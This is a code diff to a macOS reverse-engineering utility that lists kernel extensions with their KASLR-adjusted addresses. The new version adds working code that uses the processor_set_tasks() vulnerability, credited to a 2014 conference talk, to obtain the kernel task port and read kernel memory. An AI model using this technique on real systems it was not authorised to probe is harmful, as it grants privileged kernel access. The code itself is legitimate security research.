@@ -10,7 +10,7 @@
  *
  * A small util to list kernel extensions with true address in Mountain Lion due to KASLR
  *
- * (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
+ * (c) fG!, 2012, 2013, 2014 - reverser@put.as - http://reverse.put.as
  *
  * Note: This requires kmem/mem devices to be enabled
  * Edit /Library/Preferences/SystemConfiguration/com.apple.Boot.plist
@@ -21,6 +21,8 @@
  * v0.3 - Cleanups
  * v1.0 - Use diStorm to find sLoadedKexts so everything is dynamic
  *        The only dependency is on OSArray class, since we are using fixed offsets
+ * v1.1 - Try to use processor_set_tasks() vulnerability to read kernel memory
+ *        before trying to use /dev/kmem
  *
  * You will need to supply sLoadedKexts symbol, which is not exported.
  * Disassemble the kernel and go to this method OSKext::lookupKextWithLoadTag
@@ -58,42 +60,26 @@
 #include <assert.h>
 #include <sys/syscall.h>
 #include <errno.h>
+#include <mach/processor_set.h>
+#include <mach/mach_vm.h>
+#include <mach/mach.h>
+
 #include "distorm.h"
 #include "mnemonics.h"
 
-#define VERSION "1.0"
+#define VERSION "1.1"
 
 #define LOOKUPKEXTWITHLOADTAG "__ZN6OSKext21lookupKextWithLoadTagEj" // OSKext::lookupKextWithLoadTag symbol
 #define KMOD_MAX_NAME       64
-#define DISASM_SIZE         4096
+#define DISASM_SIZE         1024
 
-typedef uint64_t idt_t;
-
-struct sysent64 {		        /* system call table */
-	int16_t		sy_narg;	    /* number of args */
-	int8_t		sy_resv;	    /* reserved  */
-	int8_t		sy_flags;	    /* flags */
-    uint32_t    padding;        /* padding, x86 binary against 64bits kernel would fail */
-	uint64_t	sy_call;	    /* implementing function */
-	uint64_t	sy_arg_munge32; /* system call arguments munger for 32-bit process */
-	uint64_t	sy_arg_munge64; /* system call arguments munger for 64-bit process */
-	int32_t		sy_return_type; /* system call return types */
-	uint16_t	sy_arg_bytes;	/* Total size of arguments in bytes for
-								 * 32-bit system calls
-								 */
-};
-
-// 16 bytes IDT descriptor, used for 32 and 64 bits kernels (64 bit capable cpus!)
-struct descriptor_idt
-{
-	uint16_t offset_low;
-	uint16_t seg_selector;
-	uint8_t reserved;
-	uint8_t flag;
-	uint16_t offset_middle;
-	uint32_t offset_high;
-	uint32_t reserved2;
-};
+#define ERROR_MSG(fmt, ...) fprintf(stderr, "[ERROR] " fmt " \n", ## __VA_ARGS__)
+#define OUTPUT_MSG(fmt, ...) fprintf(stdout, fmt " \n", ## __VA_ARGS__)
+#if DEBUG == 0
+#   define DEBUG_MSG(fmt, ...) do {} while (0)
+#else
+#   define DEBUG_MSG(fmt, ...) fprintf(stdout, "[DEBUG] " fmt "\n", ## __VA_ARGS__)
+#endif
 
 struct kernel_info
 {
@@ -107,6 +93,12 @@ struct kernel_info
     uint64_t kaslr_slide;
 };
 
+struct mem_source
+{
+    int fd;
+    mach_port_t kernel_port;
+} g_kmem_source;
+
 // from xnu/bsd/sys/kas_info.h
 #define KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR     (0)     /* returns uint64_t     */
 #define KAS_INFO_MAX_SELECTOR           (1)
@@ -115,28 +107,42 @@ int kas_info(int selector, void *value, size_t *size);
 // prototypes
 void header(void);
 void usage(void);
-static int8_t readkmem(const int32_t fd, void *buffer, const uint64_t offset, const size_t size);
+static int readkmem(void *buffer, const uint64_t offset, const size_t size);
 static kern_return_t process_kernel_mach_header(const void *kernel_buffer, struct kernel_info *kinfo);
 static uint64_t read_target(uint8_t **targetBuffer, const char *target);
 static mach_vm_address_t find_sloadedkexts(uint8_t *buffer, int32_t buffer_size, mach_vm_address_t offset_addr, mach_vm_address_t iorecursivelocklock);
 
 #pragma mark Functions to read from kernel memory and file system
 
-static int8_t
-readkmem(const int32_t fd, void *buffer, const uint64_t offset, const size_t size)
+static int
+readkmem(void *buffer, const uint64_t target_addr, const size_t size)
 {
-	if(lseek(fd, offset, SEEK_SET) != offset)
-	{
-		fprintf(stderr,"[ERROR] Error in lseek. Are you root? \n");
-		return(-1);
-	}
-    ssize_t bytes_read = read(fd, buffer, size);
-	if(bytes_read != size)
-	{
-		fprintf(stderr,"[ERROR] Error while trying to read from kmem. Asked %ld bytes from offset %llx, returned %ld.\n", size, offset, bytes_read);
-		return(-2);
-	}
-    return(0);
+    if (g_kmem_source.kernel_port != 0)
+    {
+        mach_vm_size_t outsize = 0;
+        kern_return_t kr = mach_vm_read_overwrite(g_kmem_source.kernel_port, target_addr, size, (mach_vm_address_t)buffer, &outsize);
+        if (kr != KERN_SUCCESS)
+        {
+            ERROR_MSG("mach_vm_read_overwrite failed: %d.", kr);
+            return -2;
+        }
+    }
+    else if (g_kmem_source.fd != 0)
+    {
+        if(lseek(g_kmem_source.fd, target_addr, SEEK_SET) != (off_t)target_addr)
+        {
+            ERROR_MSG("Error in lseek. Are you root?");
+            return -1;
+        }
+        
+        ssize_t bytes_read = read(g_kmem_source.fd, buffer, size);
+        if(bytes_read != size)
+        {
+            ERROR_MSG("Error while trying to read from kmem. Asked %ld bytes from offset %llx, returned %ld.", size, target_addr, bytes_read);
+            return -2;
+        }
+    }
+    return 0;
 }
 
 /*
@@ -150,37 +156,37 @@ read_target(uint8_t **targetBuffer, const char *target)
     in_file = fopen(target, "r");
     if (!in_file)
     {
-		fprintf(stderr, "[ERROR] Could not open target file %s!\n", target);
-        exit(1);
+		ERROR_MSG("Could not open target file %s!", target);
+        exit(-1);
     }
     if (fseek(in_file, 0, SEEK_END))
     {
-		fprintf(stderr, "[ERROR] Fseek failed at %s\n", target);
-        exit(1);
+		ERROR_MSG("Fseek failed at %s", target);
+        exit(-1);
     }
     
     long fileSize = ftell(in_file);
     
     if (fseek(in_file, 0, SEEK_SET))
     {
-		fprintf(stderr, "[ERROR] Fseek failed at %s\n", target);
-        exit(1);
+		ERROR_MSG("Fseek failed at %s", target);
+        exit(-1);
     }
     
     *targetBuffer = malloc(fileSize * sizeof(uint8_t));
     
     if (*targetBuffer == NULL)
     {
-        fprintf(stderr, "[ERROR] Malloc failed!\n");
-        exit(1);
+        ERROR_MSG("Malloc failed!");
+        exit(-1);
     }
     
     fread(*targetBuffer, fileSize, 1, in_file);
 	if (ferror(in_file))
 	{
-		fprintf(stderr, "[ERROR] fread failed at %s\n", target);
+		ERROR_MSG("fread failed at %s", target);
         free(*targetBuffer);
-		exit(1);
+		exit(-1);
 	}
     fclose(in_file);
     return(fileSize);
@@ -191,19 +197,19 @@ read_target(uint8_t **targetBuffer, const char *target)
 void
 usage(void)
 {
-	fprintf(stderr,"kextstat_aslr\n");
-	exit(1);
+	OUTPUT_MSG("kextstat_aslr");
+	exit(-1);
 }
 
 void
 header(void)
 {
-    fprintf(stderr," _____         _   _____     _\n");
-    fprintf(stderr,"|  |  |___ _ _| |_|  _  |___| |___\n");
-    fprintf(stderr,"|    -| -_|_'_|  _|     |_ -| |  _|\n");
-    fprintf(stderr,"|__|__|___|_,_|_| |__|__|___|_|_|\n");
-	fprintf(stderr,"       KextASLR v%s - (c) fG!\n",VERSION);
-	fprintf(stderr,"-----------------------------------\n");
+    OUTPUT_MSG(" _____         _   _____     _");
+    OUTPUT_MSG("|  |  |___ _ _| |_|  _  |___| |___");
+    OUTPUT_MSG("|    -| -_|_'_|  _|     |_ -| |  _|");
+    OUTPUT_MSG("|__|__|___|_,_|_| |__|__|___|_|_|");
+	OUTPUT_MSG("       KextASLR v%s - (c) fG!",VERSION);
+	OUTPUT_MSG("-----------------------------------");
 }
 
 
@@ -302,7 +308,7 @@ solve_kernel_symbol(struct kernel_info *kinfo, char *symbol_to_solve)
         // find if symbol matches
         if (strncmp(symbol_to_solve, symbol_string, strlen(symbol_to_solve)) == 0)
         {
-            printf("[INFO] found symbol %s at %p\n", symbol_to_solve, (void*)nlist->n_value);
+            OUTPUT_MSG("[INFO] found symbol %s at %p (with ASLR: %p)", symbol_to_solve, (void*)nlist->n_value, (void*)(nlist->n_value + kinfo->kaslr_slide));
             // the symbols are without kernel ASLR so we need to add it
             return (nlist->n_value + kinfo->kaslr_slide);
         }
@@ -335,7 +341,7 @@ find_sloadedkexts(uint8_t *buffer, int32_t buffer_size, mach_vm_address_t offset
     _DInst *decodedInstructions = malloc(sizeof(_DInst) * MAX_INSTRUCTIONS);
     if (decodedInstructions == NULL)
     {
-        printf("[ERROR] Decoded instructions allocation failed!\n");
+        ERROR_MSG("Decoded instructions allocation failed!");
         return 0;
     }
     unsigned int decodedInstructionsCount = 0;
@@ -353,7 +359,7 @@ find_sloadedkexts(uint8_t *buffer, int32_t buffer_size, mach_vm_address_t offset
         if (res == DECRES_INPUTERR)
         {
             // Error handling...
-            printf("[ERROR] Distorm failed to disassemble!\n");
+            ERROR_MSG("Distorm failed to disassemble!");
             goto failure;
         }
         // iterate over the disassembly and lookup for CALL instructions
@@ -367,7 +373,7 @@ find_sloadedkexts(uint8_t *buffer, int32_t buffer_size, mach_vm_address_t offset
                 {
                     // get the sLoadedKexts from next instruction
                     mach_vm_address_t sloadedkexts = INSTRUCTION_GET_RIP_TARGET(&decodedInstructions[i+1]);
-                    printf("[INFO] sLoadedKexts at %p\n", (void*)sloadedkexts);
+                    OUTPUT_MSG("[INFO] sLoadedKexts at %p", (void*)sloadedkexts);
                     return sloadedkexts;
                 }
             }
@@ -402,18 +408,47 @@ int main(int argc, char ** argv)
 	// we need to run this as root
 	if (getuid() != 0)
 	{
-		printf("[ERROR] Please run me as root!\n");
-		exit(1);
+		ERROR_MSG("Please run me as root!");
+		exit(-1);
 	}
-		
-    int32_t fd_kmem = -1;
+	
+    /* test if we can read kernel memory using processor_set_tasks() vulnerability */
+    /* vulnerability presented at BlackHat Asia 2014 by Ming-chieh Pan, Sung-ting Tsai. */
+    /* also described in Mac OS X and iOS Internals, page 387 */
+    host_t host_port = mach_host_self();
+    mach_port_t proc_set_default = 0;
+    mach_port_t proc_set_default_control = 0;
+    task_array_t all_tasks = NULL;
+    mach_msg_type_number_t all_tasks_cnt = 0;
+    kern_return_t kr = 0;
+    int valid_kernel_port = 0;
     
-	if((fd_kmem = open("/dev/kmem",O_RDWR)) == -1)
-	{
-		fprintf(stderr,"[ERROR] Error while opening /dev/kmem. Is /dev/kmem enabled?\n");
-		fprintf(stderr,"Add parameter kmem=1 to /Library/Preferences/SystemConfiguration/com.apple.Boot.plist\n");
-		exit(1);
-	}
+    kr = processor_set_default(host_port, &proc_set_default);
+    if (kr == KERN_SUCCESS)
+    {
+        kr = host_processor_set_priv(host_port, proc_set_default, &proc_set_default_control);
+        if (kr == KERN_SUCCESS)
+        {
+            kr = processor_set_tasks(proc_set_default_control, &all_tasks, &all_tasks_cnt);
+            if (kr == KERN_SUCCESS)
+            {
+                OUTPUT_MSG("Found valid kernel port using processor_set_tasks() vulnerability!");
+                g_kmem_source.kernel_port = all_tasks[0];
+                valid_kernel_port = 1;
+            }
+        }
+    }
+
+    /* kernel not vulnerable, try to use /dev/kmem */
+    if (valid_kernel_port == 0)
+    {
+        if((g_kmem_source.fd = open("/dev/kmem",O_RDWR)) == -1)
+        {
+            ERROR_MSG("Error while opening /dev/kmem. Is /dev/kmem enabled?");
+            ERROR_MSG("Add parameter kmem=1 to /Library/Preferences/SystemConfiguration/com.apple.Boot.plist.");
+            exit(-1);
+        }
+    }
 
     // retrieve kernel aslr slide using kas_info() syscall
     // this is a private kernel syscall but we can access it in Mountain Lion if we link against System.framework
@@ -424,10 +459,10 @@ int main(int argc, char ** argv)
     int ret = kas_info(KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR, &kaslr_slide, &kaslr_size);
     if (ret != 0)
     {
-        printf("[ERROR] Could not get kernel ASLR slide info from kas_info(). Errno: %d\n", errno);
-        exit(1);
+        ERROR_MSG("Could not get kernel ASLR slide info from kas_info(). Errno: %d.", errno);
+        exit(-1);
     }
-    printf("[INFO] Kernel ASLR slide is 0x%llx\n", kaslr_slide);
+    OUTPUT_MSG("[INFO] Kernel ASLR slide is 0x%llx", kaslr_slide);
 
     // get info from the kernel at disk
     uint8_t *kernel_buffer = NULL;
@@ -436,8 +471,8 @@ int main(int argc, char ** argv)
     struct kernel_info kinfo = { 0 };
     if (process_kernel_mach_header((void*)kernel_buffer, &kinfo))
     {
-        printf("[ERROR] Kernel Mach-O header processing failed!\n");
-        exit(1);
+        ERROR_MSG("Kernel Mach-O header processing failed!");
+        exit(-1);
     }
     // set a pointer to __LINKEDIT location in the kernel buffer
     kinfo.linkedit_buf = (void*)((char*)kernel_buffer + kinfo.linkedit_fileoff);
@@ -448,51 +483,53 @@ int main(int argc, char ** argv)
     mach_vm_address_t iorecursivelocklock = solve_kernel_symbol(&kinfo, "_IORecursiveLockLock");
     // disassemble and find the address of sLoadedKexts
     // it's easier to read it from memory than disk
-    uint8_t loadtag_buffer[DISASM_SIZE];
-    if (readkmem(fd_kmem, loadtag_buffer, loadtag_symbol, DISASM_SIZE) != 0)
+    uint8_t loadtag_buffer[DISASM_SIZE] = {0};
+    /* XXX: we might have problems reading out of bounds using the vuln so reduce size to 1024 */
+    /*      fix should be check if size will go out of kernel memory */
+    if (readkmem(loadtag_buffer, loadtag_symbol, DISASM_SIZE) != 0)
     {
-        printf("[ERROR] Unable to read OSKext::lookupKextWithLoadTag from kernel memory!\n");
-        exit(1);
+        ERROR_MSG("Unable to read OSKext::lookupKextWithLoadTag from kernel memory!");
+        exit(-1);
     }
     mach_vm_address_t sLoadedKexts = find_sloadedkexts(loadtag_buffer, DISASM_SIZE, loadtag_symbol, iorecursivelocklock);
     if (sLoadedKexts == 0)
     {
-        printf("[ERROR] sLoadedKexts not found!\n");
-        exit(1);
+        ERROR_MSG("sLoadedKexts not found!");
+        exit(-1);
     }
     mach_vm_address_t sLoadedKexts_object = 0;
     // read where sLoadedKexts is pointing to so we can get the OSArray object
-    readkmem(fd_kmem, &sLoadedKexts_object, sLoadedKexts, 8);
-    printf("[INFO] sLoadedKexts OSArray object located at 0x%llx\n", sLoadedKexts_object);
+    readkmem(&sLoadedKexts_object, sLoadedKexts, 8);
+    OUTPUT_MSG("[INFO] sLoadedKexts OSArray object located at 0x%llx", sLoadedKexts_object);
     uint32_t kexts_count = 0;
-    readkmem(fd_kmem, &kexts_count, sLoadedKexts_object+0x20, sizeof(unsigned int));
+    readkmem(&kexts_count, sLoadedKexts_object+0x20, sizeof(unsigned int));
     if (kexts_count == 0)
     {
-        printf("[ERROR] Could not retrieve number of loaded kexts!\n");
-        exit(1);
+        ERROR_MSG("Could not retrieve number of loaded kexts!");
+        exit(-1);
     }
-    printf("[INFO] Total kexts loaded %d\n", kexts_count);
+    OUTPUT_MSG("[INFO] Total kexts loaded %d", kexts_count);
     mach_vm_address_t array_ptr = 0;
-    readkmem(fd_kmem, &array_ptr, sLoadedKexts_object+0x18, sizeof(mach_vm_address_t));
-    printf("[INFO] Array of OSKext starts at 0x%llx\n", array_ptr);
+    readkmem(&array_ptr, sLoadedKexts_object+0x18, sizeof(mach_vm_address_t));
+    OUTPUT_MSG("[INFO] Array of OSKext starts at 0x%llx", array_ptr);
     size_t OSKext_object_len = kexts_count * sizeof(mach_vm_address_t);
     mach_vm_address_t *OSKext_object = malloc(OSKext_object_len);
-    if (readkmem(fd_kmem, OSKext_object, array_ptr, OSKext_object_len) != 0)
+    if (readkmem(OSKext_object, array_ptr, OSKext_object_len) != 0)
     {
-        printf("[ERROR] Failed to read OSKext array!\n");
-        exit(1);
+        ERROR_MSG("Failed to read OSKext array!");
+        exit(-1);
     }
 
-    printf("Index  Refs  Address             Size        Name (Version)\n");
+    OUTPUT_MSG("Index  Refs  Address             Size        Name (Version)");
     for (unsigned int i = 0; i < kexts_count; i++)
     {
         mach_vm_address_t kmod_info_ptr = 0;
-        readkmem(fd_kmem, &kmod_info_ptr, OSKext_object[i]+0x48, sizeof(kmod_info_ptr));
+        readkmem(&kmod_info_ptr, OSKext_object[i]+0x48, sizeof(kmod_info_ptr));
         kmod_info_t kmod_info = { 0 };
-        readkmem(fd_kmem, &kmod_info, kmod_info_ptr, sizeof(kmod_info_t));
+        readkmem(&kmod_info, kmod_info_ptr, sizeof(kmod_info_t));
         char name[KMOD_MAX_NAME];
-        readkmem(fd_kmem, &name, kmod_info_ptr+0x10, sizeof(name));
-        printf("%5d  %4d  0x%016llx  0x%-8lx  %s (%s)\n", i, kmod_info.reference_count, (uint64_t)kmod_info.address, kmod_info.size, kmod_info.name, kmod_info.version);
+        readkmem(&name, kmod_info_ptr+0x10, sizeof(name));
+        OUTPUT_MSG("%5d  %4d  0x%016llx  0x%-8lx  %s (%s)", i, kmod_info.reference_count, (uint64_t)kmod_info.address, kmod_info.size, kmod_info.name, kmod_info.version);
     }
 end:
     free(OSKext_object);
